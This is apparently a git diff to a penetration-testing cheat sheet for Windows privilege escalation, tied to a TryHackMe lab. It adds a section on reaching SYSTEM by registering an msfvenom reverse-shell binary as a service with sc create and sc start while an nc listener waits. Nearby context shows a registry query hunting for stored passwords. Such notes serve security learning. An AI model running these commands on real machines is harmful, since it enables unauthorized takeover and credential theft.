@@ -14,6 +14,7 @@
 * [SeTakeOwnership](#setakeownership)
 * [Tools of the Trade](#tools-of-the-trade)
 * [Look for the password Keyword in the Registry](#look-for-the-password-keyword-in-the-registry)
+* [Priv Esc From Administrator to nt authority\system](#priv-esc-from-administrator-to-nt-authority\system)
 
 *********************************************************************************
 Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
@@ -275,6 +276,28 @@ OR
 ```
 C:\Users\[USER]> reg query HKCU /f password /t REG_SZ /s
 ```
+
+********************************************
+
+## Priv Esc From Administrator to nt authority\system
+
+Credit: https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html
+
+* First transfer a msfvenom reverse shell to the target
+
+* Start a nc listener
+
+* Then from a cmd gui (I couldn't get this to work from a Evil-WinRM Shell) do these commands:
+
+```
+sc create kyser binpath= "C:\TEMP\reverse.exe" type= own type= interact
+```
+```
+sc start kyser
+```
+* now you should have a shell as nt authority\system
+
+
 
 ### Reference:
 * https://tryhackme.com/room/windowsprivesc20
